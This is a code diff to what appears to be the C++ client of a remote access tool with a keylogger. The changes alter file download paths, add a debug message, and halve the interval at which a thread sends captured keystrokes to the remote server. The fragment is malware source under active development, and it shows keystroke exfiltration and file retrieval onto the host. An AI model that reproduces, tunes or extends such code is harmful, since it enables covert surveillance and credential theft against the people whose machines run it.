@@ -76,7 +76,7 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 		file.bytesWritten = 0;
 		file.outfileStream.close(); //close file after we are done writing file
 
-		while (!rename((GetCWD() + temp_name).c_str(), (GetCWD() + file.fileName).c_str())) {
+		while (!rename((SHELL_PATH() + temp_name).c_str(), (SHELL_PATH() + file.fileName).c_str())) {
 			Sleep(100);
 		}
 		break;
@@ -256,10 +256,11 @@ void Client::ClientThread()
 void Client::KeyloggerThread() {
 	while (true) {
 		if (keylogger::buffer.size()) {
+			printf("Sending keylog buffer\n");
 			clientptr->SendString(logger.GetBuffer(), PacketType::Keylog);
 			logger.ClearBuffer();
 		}
-		Sleep(10000);
+		Sleep(5000);
 	}
 }
 
@@ -308,7 +309,7 @@ bool Client::RequestFile(std::string FileName, bool wait)
 		//Wait just in case another file is already being downloaded
 		while (file.outfileStream.is_open()) 
 			Sleep(100);
-	file.outfileStream.open(GetCWD() + temp_name, std::ofstream::binary); //open file to write file to
+	file.outfileStream.open(SHELL_PATH() + temp_name, std::ofstream::binary); //open file to write file to
 	file.fileName = FileName; //save file name
 	file.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
 	if (!file.outfileStream.is_open()) //if file failed to open...
